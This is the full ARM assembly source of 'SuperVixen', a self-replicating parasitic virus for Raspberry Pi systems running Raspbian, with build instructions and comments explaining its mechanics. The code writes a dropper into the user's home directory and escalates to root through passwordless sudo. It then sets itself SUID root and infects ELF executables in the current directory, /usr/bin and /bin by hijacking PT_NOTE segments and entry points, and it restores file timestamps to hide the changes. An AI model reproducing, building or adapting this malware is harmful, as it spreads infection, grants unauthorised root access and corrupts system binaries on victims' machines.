/*

        % RaspberryPi.SuperVixen - JPanic, 2014 %
                _________________________________________
                (From the Double-A to the Triple-X)

                SuperVixen is a 1964 byte long parasitic virus targeting executables
                on Raspberry Pi boards running 'Raspbian' - Debian based Linux.

                The virus is written in ARM v6 assembler and targets appropriate ELF32
                binaries using pure Linux syscalls.

                To build:       as supervixen.s -o supervixen.o
                                        ld.exe supervixen.o -N -o supervixen

                When an infected binary is executed the virus creates an ELF32 dropper
                at "~/cherry.lips/supervixen", where '~' is the HOME environment
                variable, and executes it. The dropper consists of the virus body
                begining with an ELF32 Ehdr, then a single Phdr.

                If geteuid() returns "0" or the dropper already exists as SUID root,
                a normal execve() call is used to execute it. Otherwise the execve()
                call executes it as a command line parameter of "/usr/bin/sudo". To
                force root. (Note that on a default Raspbian installation, "sudo" does
                not ask for a password or anyother form of authentication). Once the
                dropper is run as root, it sets itself SUID 0, so "sudo" does not have
                to be used again.

                When the supervixen dropper is executed, it attempts to infect all
                suitable ELF32 binaries in ".", "/usr/bin" and "/bin". Infection of a
                system seems reasonably fast. The virus executes the dropper with no
                command line parameters. If the user were to execute it with any
                number of command line parameters, the dropper will simply display an
                'activation' message and exit.

                Infection method of ELF32 binaries is fast and simple: if the file is
                suitable the virus is appended, the PT_NOTE Phdr is changed to a
                PT_LOAD containing the virus and e_entry is hooked in the Ehdr. The
                virus is appended on a 32-byte boundary, hence the infection marker is:
                filesize % 32 == virussize % 32.

                The virus does not infect files with a period ('.') in their name, or
                files beginning with "sudo".

                I fucking hope this thing is bug free :P

                - JPanic.
*/

.include "supervixen.inc"
.include "linux.inc"
.include "elf32.inc"

.set virus_psize, virus_pend - virus_start
.set virus_msize, virus_mend - virus_start
.set dropper_hdr_size, Elf32_Ehdr_size + Elf32_Phdr_size

.equ ELF_BASE, 0x8000

.text
.balign 4
virus_start:
/* DROPPER HEADERS -------------------------------------------------------*/
dropper_start:
        /* e_ident */
C_ELF1:
        .word   ELF32_MAGIC
C_ELF2:
        .byte   ELFCLASS32
        .byte   ELFDATA2LSB
        .byte   EV_CURRENT
        .byte   0
        .byte   0
        /* padding */
        .ascii "JPANIC!"
        /* rest of Ehdr */
        .hword  ET_EXEC
        .hword  EM_ARM
        .word   EV_CURRENT
        .word   ELF_BASE + dropper_hdr_size + 4
        .word   Elf32_Ehdr_size
        .word   0
        .word   0x05000002
        .hword  Elf32_Ehdr_size
        .hword  Elf32_Phdr_size
        .hword  1
        .hword  0
        .hword  0
        .hword  0
        /* Phdr */
        .word   PT_LOAD
        .word   0
        .word   ELF_BASE
        .word   0
        .word   virus_psize
        .word   virus_msize
        .word   PF_X + PF_W + PF_R
        .word   ELF_BASE

        .ascii "AA.."   /* From the Double-A */

/* DROPPER CODE ----------------------------------------------*/
.balign 4
/* Execution begins here when dropper is run. */
dropper_entry:
        /* Execute activation routine if any command line parameters. */
        ldr             r0,[sp]
        cmp             r0,#1
        bne             activate
        /* If we are running as root we use /proc/self/exe to set the
           dropper SUID root.
        */
        mov             r7,#syscall_geteuid
        swi             #0
        cmp             r0,#0
        bne             .no_set_suid
        loffs           r0,selfexe
        l32c            r1,D_DROPPERFILE
        mov             r2,#MAX_PATH
        mov             r7,#syscall_readlink
        swi             #0
        cmp             r0,#0
        /* Do not set SUID if sys_readlink() failed, otherwise append
           terminating Zero to dropper filename string, chown() to root
           and set mode SUID+rwxrwxrwx.
        */
        bls             .no_set_suid
        add             r0,r1
        sub             r8,r8
        str             r8,[r0]
        mov             r0,r1
        sub             r1,r1
        mov             r2,#-1
        mov             r7,#syscall_chown
        swi             #0
        cmp             r0,#0
        blt             .no_set_suid
        l32c            r0,D_DROPPERFILE
        l32             r1,S_ISUID + 0777
        mov             r7,#syscall_chmod
        swi             #0
.no_set_suid:
        /* Begin infection here. Infect current working directory,
           then /usr/bin then /bin.
        */
        bl              infect_dir
        loffs           r0,targetdir1
        mov             r7,#syscall_chdir
        swi             #0
        bl              infect_dir
        loffs           r0,targetdir2
        mov             r7,#syscall_chdir
        swi             #0
        bl              infect_dir
        /* exit - terminate dropper with error level 0 here. */
.EXIT:  mov r0, #0
        mov r7,#syscall_exit_group
        swi #0

        .asciz "I tried hard to mend my wicked ways..."

selfexe: .asciz "/proc/self/exe"

targetdir1: .ascii "/usr"       /* /usr/bin */
targetdir2: .asciz "/bin"


/* SYMBIOT CODE ----------------------------------------------------------------*/
.balign 4
.globl _start
_start:
infection_entry:
        /* Execute begins here for symbiot injected into infected files, as well
           as the Generation-Zero virus.
        */
        push            {r0,r1,r2,r3,r4,r5,r6,r7,r8,r9,r10,r11,r12,lr}
        /* Store host PC to return to later. */
        loffs           r0,host_pc
        ldr             r1,[r0]
        str             r1,[r0,#4]
        add             r0,sp,#4 * 14
        /* Attempt to find "HOME" environment variable on stack. */
        ldr             r1,[r0]         /* argc */
        lsl             r1,#2
        add             r1,sp
        add             r1,#(4 * 14) + 8 /* environment pointers */
        l32             r0,'H' + ('O' << 8) + ('M' << 16) + ('E' << 24)
.env_loop:              /* Loop until HOME found or end of envp array. */
                        ldr             r2,[r1]
                        /* return to host if last envp reached. */
                        cmp             r2,#0
                        beq             host_return
                        /* check for HOME= */
                        ldrb            r4,[r2,#4]
                        cmp             r4,#'='
                        bne             .env_next
                        ldr             r3,[r2]
                        cmp             r3,r0
                        beq             .HOME_found /* Success! */
                .env_next:
                        add             r1,#4
                        b               .env_loop

const_dropper_dir: .ascii "/cherry.lips"
const_dropper_file: .asciz "/supervixen"

.balign 4
.HOME_found:
        /* HOME directory (~) found - append dropper sub-directory and filename */
        add             r2,#5
        loffsl          r0,dropper_dir
        add             r1,r0,#dropper_file - dropper_dir
        mov             r4,#MAX_PATH - 32
        /* Copy HOME directory to dropper directory and filename buffers,
           abort if directory name is too long.
        */
.home_name_loop:                ldrb    r3,[r2],#1
                                cmp     r3,#0
                                beq     .do_append_name /* Success! */
                                strb    r3,[r0],#1
                                strb    r3,[r1],#1
                                sub     r4,#1
                                bne     .home_name_loop
                                b       host_return     /* Fail - return to host. */
.do_append_name:
        /* Create dropper directory name and dropper filename
           by appending to the end of HOME.
        */
        sub     r9,r9
        loffs   r2,const_dropper_dir
        ldmia   r2,{r3,r4,r5,r6,r7,r8}
        stmia   r0,{r3,r4,r5,r9}
        stmia   r1,{r3,r4,r5,r6,r7,r8}
        /* Begin Creating Dropper. */
        /* Test for dropper directory already exists before create. */
        loffsl          r0,dropper_dir
        loffsl          r1,stat_buf
        mov             r7,#syscall_stat
        swi             #0
        cmp             r0,#0
        beq             .test_dropper_file
.create_dropper_dir:
        /* Create dropper direcrory.
           Return to host if sys_mkdir() fails.
        */
        loffsl          r0,dropper_dir
        l32c            r1,C_777        /* rwxrwxrwx */
        mov             r7,#syscall_mkdir
        swi             #0
        cmp             r0,#0
        bne             host_return
.test_dropper_file:
        /* Test if dropper file already exists before creating. */
        loffsl          r0,dropper_file
        loffsl          r1,stat_buf
        mov             r7,#syscall_stat
        swi             #0
        cmp             r0,#0
        beq             .exec_dropper_file
.create_dropper_file:
        /* Create dropper file.
           Return to host if open O_CREAT fails.
        */
        loffsl          r0,dropper_file
        l32             r1,O_CREAT+O_TRUNC+O_WRONLY
        l32c            r2,C_777        /* rwxrwxrwx*/
        mov             r7,#syscall_open
        swi             #0
        cmp             r0,#0
        blt             host_return
        /* Write virus image to dropper file.
           Return to host if sys_write() fails.
        */
        mov             r8,r0
        loffs           r1,virus_start
        l32c            r2,C_PSIZE
        mov             r7,#syscall_write
        swi             #0
        cmp             r0,r2
        bne             host_return
        /* Close dropper. */
        mov             r0,r8
        mov             r7,#syscall_close
        swi             #0
.exec_dropper_file:
        /* Begin preparing for execution of dropper file.
           Return to host if dropper still does not exist.
        */
        loffsl          r0,dropper_file
        loffsl          r1,stat_buf
        mov             r7,#syscall_stat
        swi             #0
        cmp             r0,#0
        bne             host_return
.do_fork_execve:
        /* FORK - have the child execute the dropper
           and the parent wait().
        */
        mov             r7,#syscall_fork
        swi             #0
        cmp             r0,#0
        bne             .wait
        /* CHILD begins here. */
        /* Prepare to execute the dropper using 'sudo' to gain root,
           then take sudo out of the execution if current EUID is root,
           or the dropper is already SUID root.
        */
        mov             r7,#syscall_geteuid
        swi             #0
        mov             r5,r0
        ldrH            r11,[r1,#st_uid]
        ldrH            r12,[r1,#st_mode]
        /* Setup registers for sys_execve() using sudo. */
        loffs           r0,sudo
        loffsl          r8,dropper_file
        loffs           r1,sudo_arg0
        str             r0,[r1]
        str             r8,[r1,#4]
        loffs           r2,const_null
        /* Check for dropper == suid root or euid == root. */
        cmp             r11,#0
        bne             .try_euid
        tst             r12,#S_ISUID
        bne             .no_suid
.try_euid:
        cmp             r5,#0
        bne             .execve
.no_suid:
        /* Get rid of sudo in sys_execve() call here. */
        add             r1,#4
        mov             r0,r8
.execve:
        /* Complete the execve(). */
        mov             r7,#syscall_execve
        swi             #0

sudo: .ascii "/usr/bin/"
C_SUDO: .asciz "sudo"

.balign 4
sudo_arg0: .word 0
dropper_file_ptr: .word 0
const_null:     .word 0

/* return to host -------------------------------------------------*/
.wait:  /* PARENT begins here - just wait(). */
        loffs           r1,sudo_arg0
        mov             r2,#0 /*#WNOHANG*/
        sub             r3,r3
        mov             r7,#syscall_wait4
        swi             #0
host_return:
        /* Return to host. */
        pop             {r0,r1,r2,r3,r4,r5,r6,r7,r8,r9,r10,r11,r12,lr}
        ldr             pc,[pc]
host_pc:
        .word   host
        .word   0

/* activate ---------------------------------------------------------*/
activate:
        /* Activation routine - just display a silly message and exit. */
        mov             r0,#stdout
        loffs           r1,activation_string
        mov             r2,#after_activation_string - activation_string
        mov             r7,#syscall_write
        swi             #0
        b               .EXIT

activation_string:
        .ascii "> ((=- RaspberryPi.SuperVixen -=)) - AUTOMATIC SYSTEMATIC HABIT by JPanic - Australia - 2014 <\n"
after_activation_string:

dot: .asciz "."

/* infect current directory---------------------------------------- */
.balign 4
infect_dir:
        push    {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9 ,r10, r11, r12,lr}
        /* mmap2 - Allocate getdents() buffer */
        sub             r0,r0
        mov             r1,#0x10000             /* 64kb */
        mov             r2,#PROT_READ+PROT_WRITE
        mov             r3,#MAP_PRIVATE+MAP_ANONYMOUS
        mov             r4,#-1
        sub             r5,r5
        mov             r7,#syscall_mmap2
        swi             #0
        cmn             r0,#0x1000
        bcs             .exitD  /* return if mmap fails. */
        /* Open '.' read-only. */
        mov             r12,r0
        loffs           r0,dot
        mov             r1,#O_RDONLY
        mov             r7,#syscall_open
        swi             #0
        cmp             r0,#0
        blt             .exitMM /* return and unmap if open fails*/
        mov             r11,r0
        /* Outer Loop - One iteration per getdents() call. */
        .get_dents_loop:/* Getdents
                           close,unmap and exit on failure or completion.
                        */
                        mov             r0,r11
                        mov             r1,r12
                        mov             r2,#0x10000
                        mov             r7,#syscall_getdents
                        swi             #0
                        cmp             r0,#0
                        ble             .exitFD
                        /* r10 = end of dirents buffer.
                           r8 = first dirent.
                        */
                        add             r10,r12,r0
                        mov             r8,r12
                        /* Inner loop - One iteration per directory entry. */
                        .entry_loop:    /* Next getdents() call when end of buffer reached. */
                                        cmp             r8,r10
                                        bhs             .get_dents_loop
                                        bl              inspect_file    /* attempt infection. */
                                        /* get next entry */
                                        ldrH            r0,[r8,#d_reclen]
                                        add             r8,r0
                                        b               .entry_loop
.exitFD:/* Exit procedure - close and unmap. */
        mov             r0,r11
        mov             r7,#syscall_close
        swi             #0
.exitMM:
        mov             r0,r12
        mov             r1,#0x10000
        mov             r7,#syscall_munmap
        swi             #0
.exitD:
        pop             {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9 ,r10, r11, r12,pc}

/* inspect file -----------------------------------------------------*/
/* Infect filename pointed to by r8 for infection. */
inspect_file:
        push    {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9 ,r10, r11, r12,lr}
        add             r8,#d_name
        l32c            r1,C_SUDO       /* do not infet 'sudo'. */
        ldr             r2,[r8]
        cmp             r1,r2
        beq             .exitI
        /* Copy victims name to buffer, checking filename length and avoiding
           filenames with '.' in them.
        */
        l32c            r1,D_NAMEBUF
        mov             r0,r1
        mov             r2,#MAX_PATH
.name_loop:             ldrb    r3,[r8],#1
                        cmp     r3,#'.'
                        beq     .exitI
                        strb    r3,[r1],#1
                        cmp     r3,#0
                        beq     .do_stat
                        sub     r2,#1
                        bne     .name_loop
                        b       .exitI
.do_stat:
        /* Call stat() to check filesize and modes. */
        l32c            r1,D_STATBUF
        mov             r7,#syscall_stat
        swi             #0
        cmp             r0,#0
        bne             .exitI
        ldr             r0,[r1,#st_size]
        cmp             r0,#4096        /* min size: 4kb */
        blo             .exitI
        cmp             r0,#512 * 1024  /* maz size: 512mb */
        bhi             .exitI
        and             r0,#0x1F        /* avoid infected files. */
        cmp             r0,#virus_psize & 0x1F
        beq             .exitI
        ldrH            r0,[r1,#st_mode]
        tst             r0,#S_IFREG     /* regular files only. */
        beq             .exitI
        tst             r0,#S_IXOTH + S_IXGRP + S_IXUSR /* executables modes only */
        blne            infect_file     /* Infect! */
.exitI:
        pop             {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9 ,r10, r11, r12,pc}

/* Infect inspected ELF ------------------------------------------*/
infect_file:
        push    {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9 ,r10, r11, r12,lr}
        /* Initialize variables. */
        l32c            r10,D_PTNOTEOFF
        sub             r1,r1
        str             r1,[r10]
        str             r1,[r10,#4]
        /* Attempt to open victim, exit on failure. */
        l32c            r0,D_NAMEBUF
        mov             r1,#O_RDWR
        mov             r7,#syscall_open
        swi             #0
        cmp             r0,#0
        blt             .exit
        mov             r12,r0
        /* Attempt to read Elf32_Ehdr, close and exit on failure. */
        l32c            r1,D_EHDRBUF
        mov             r2,#Elf32_Ehdr_size
        mov             r7,#syscall_read
        swi             #0
        cmp             r0,r2
        bne             .close
        /* Inspect and Evaluate Ehdr for infection. */
        l32c            r0,C_ELF1
        ldmia           r1,{r2,r9}
        cmp             r0,r2     /* ELF_MAGIC */
        bne             .close
        l32c            r0,C_ELF2 /* ELFCLASS32 + ELFDATA2LSB + EV_CURRENT */
        cmp             r9,r0
        bne             .close
        l32             r0,ET_EXEC + (EM_ARM << 16) /* ET_EXEC + EM_ARM */
        ldr             r2,[r1,#e_type]
        cmp             r2,r0
        bne             .close
        /* First Elf32_Phdr must be immediately after Elf32_Ehdr */
        ldr             r9,[r1,#e_phoff]
        cmp             r9,#Elf32_Ehdr_size
        bne             .close
        /* Check Elf32_Ehdr_size (e_ehsize)  + Elf32_Phdr_size (e_phsize) */
        add             r0,r9,#(Elf32_Phdr_size << 16)
        ldr             r2,[r1,#e_ehsize]
        cmp             r2,r0
        bne             .close
        /* 16 Elf32_Phdr's or less. */
        ldrH            r8,[r1,#e_phnum]
        cmp             r8,#16
        bhi             .close
        /* Inspect Elf32_Phdr's.
           r8 = phnum, r9 = phoff, r10 = vars (pt_note_off, max_addr)
           Loop to find PT_NOTE entry and maximum used virtual address
           by PT_LOAD entries.
        */
.ph_loop:               /* Read one Phdr entry - close and exit if error. */
                        mov             r0,r12
                        l32c            r1,D_PHDRBUF
                        mov             r2,#Elf32_Phdr_size
                        mov             r7,#syscall_read
                        swi             #0
                        cmp             r0,r2
                        bne             .close
                        ldr             r11,[r1,#p_type]
                        /* Handle PT_NOTE - save physical offset of entry.
                           close and exit if more than one PT_NOTE entry found.
                        */
                        cmp             r11,#PT_NOTE
                        bne             .not_note
                        ldr             r11,[r10]
                        cmp             r11,#0
                        bne             .close
                        str             r9,[r10]
                        b               .ph_next
        .not_note:      /* Handle PT_LOAD - check alignment is good and save
                           maximum virtual address (vaddr + memsz) found.
                           Close and exit on bad alignment.
                        */
                        cmp             r11,#PT_LOAD
                        bne             .ph_next
                        ldr             r11,[r1,#p_align]
                        cmp             r11,#ELF_BASE
                        bne             .close
                        ldr             r11,[r1,#p_vaddr]
                        ldr             r6,[r1,#p_memsz]
                        add             r11,r6
                        ldr             r6,[r10,#4]
                        cmp             r11,r6
                        strhi           r11,[r10,#4]
.ph_next:               /* go for the next Elf32_Phdr entry. */
                        add             r9,#Elf32_Phdr_size
                        subS            r8,#1
                        bne             .ph_loop
        /* Close and exit if PT_NOTE or maximum virtual address not found. */
        ldr             r11,[r10]
        cmp             r11,#0
        beq             .close
        ldr             r6,[r10,#4]
        cmp             r6,#0
        beq             .close
        /* Calculate new physical offset and virtual address of the viruses
           PT_LOAD segment. Virus is appended on a 32-byte boundary.
        */
        l32c    r8,D_STATBUF
        ldr             r1,[r8,#st_size]
        add             r1,#31
        mvn             r11,#31
        and             r1,r11
        loffs           r11,new_phdr            /* Store new physical address in new Elf32_Phdr. */
        str             r1,[r11,#p_offset]
        l32             r8,ELF_BASE - 1
        and             r9,r8,r1
        add             r6,r8
        mvn             r8,r8
        and             r6,r8
        add             r6,r9
        str             r6,[r11,#p_vaddr]       /* Store new virtual address in new Elf32_Phdr. */
        /* Append virus / save original entrypoint.
           Restore timestamps,close, exit on error.
           r1 = offs, r3 = buf, r4 = count.
        */
        l32c            r0,D_EHDRBUF
        ldr             r8,[r0,#e_entry]
        loffs           r0,host_pc
        str             r8,[r0]
        mov             r3,#ELF_BASE
        l32c            r4,C_PSIZE
        bl              pwrite
        bne             .utime
        /* Write new Elf32_Phdr (PT_LOAD replacing PT_NOTES).
           Restore timestamps,close, exit on error.
        */
        ldr             r1,[r10]
        mov             r3,r11
        mov             r4,#Elf32_Phdr_size
        bl              pwrite
        bne             .utime
        /* Write new Elf32_Ehdr (new e_entry).
           Restore timestamps,close, exit on error.
        */
        l32             r0,infection_entry - virus_start
        add             r0,r6
        l32c            r3,D_EHDRBUF
        str             r0,[r3,#e_entry]
        mov             r4,#Elf32_Ehdr_size
        sub             r1,r1
        bl              pwrite
.utime: /* Restore timestamps, close, exit.*/
        l32c            r0,D_NAMEBUF
        l32c            r1,D_STATBUF
        add             r1,#st_atime
        ldr             r10,[r1,#4]
        lsr             r10,#10
        str             r10,[r1,#4]
        ldr             r10,[r1,#12]
        lsr             r10,#10
        str             r10,[r1,#12]
        l32             r7,syscall_utimes
        swi             #0
.close: mov             r0,r12
        mov             r7,#syscall_close
        swi             #0
.exit:  pop             {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9 ,r10, r11, r12,pc}

/* New PT_LOAD Elf32_Phdr to replace PT_NOTES in victim. */
new_phdr:
        .word   PT_LOAD
new_phdr_offs:
        .word   0
new_phdr_vaddr:
        .word   0
        .word   0
C_PSIZE:
        .word   virus_psize
C_MSIZE:
        .word   virus_msize
        .word   PF_X+PF_W+PF_R
        .word   ELF_BASE

/* pwrite - seek and write.*/
/* r1 = offs, r3 = buf, r4 = count */
pwrite:
        mov             r0,r12
        sub             r2,r2
        mov             r7,#syscall_lseek
        swi             #0
        mov             r0,r12
        mov             r1,r3
        mov             r2,r4
        mov             r7,#syscall_write
        swi             #0
        cmp             r0,r2
        mov             pc,lr


/* DATA ------------------------------------------------------------*/

C_777:  .word 0777

D_STATBUF:      .word stat_buf + ELF_BASE - dropper_start
D_NAMEBUF:      .word namebuf + ELF_BASE - dropper_start
D_EHDRBUF:      .word ehdr_buf + ELF_BASE - dropper_start
D_PHDRBUF:      .word phdr_buf + ELF_BASE - dropper_start
D_PTNOTEOFF:    .word pt_note_off + ELF_BASE - dropper_start
D_DROPPERFILE:  .word dropper_file + ELF_BASE - dropper_start


.text 1
.ascii ".XXX" /* to the Triple-X */
virus_pend:

/* BSS */
.text 3
.balign 4
pt_note_off: .word 0
max_addr: .word 0

.balign 4
dropper_dir: .fill MAX_PATH,1,0
dropper_file: .fill MAX_PATH,1,0

.balign 4
namebuf: .fill MAX_PATH,1,0
.word 0
.balign 4
ehdr_buf: .fill Elf32_Ehdr_size,1,0
.balign 4
phdr_buf: .fill Elf32_Phdr_size,1,0
.balign 4
stat_buf: .fill stat_size,1,0
virus_mend:

.text 4
/* BEGIN HOST ---------------------------------------------------------------------------------------*/
.balign 4
host:
        mov r0, #1
        ldr     r1,=hgreeting
        mov r2,#after_hgreeting - hgreeting
        mov r7, #4
        swi #0
        mov r0, #0
        mov r7,#1
        swi #0

hgreeting:
.ascii "> ((=- RaspberryPi.SuperVixen -=)) - AUTOMATIC SYSTEMATIC HABIT by JPanic - Australia - 2014 <\n\n"
.ascii "SuperVixen Virus Host Generation Zero - executed!\n"
after_hgreeting:
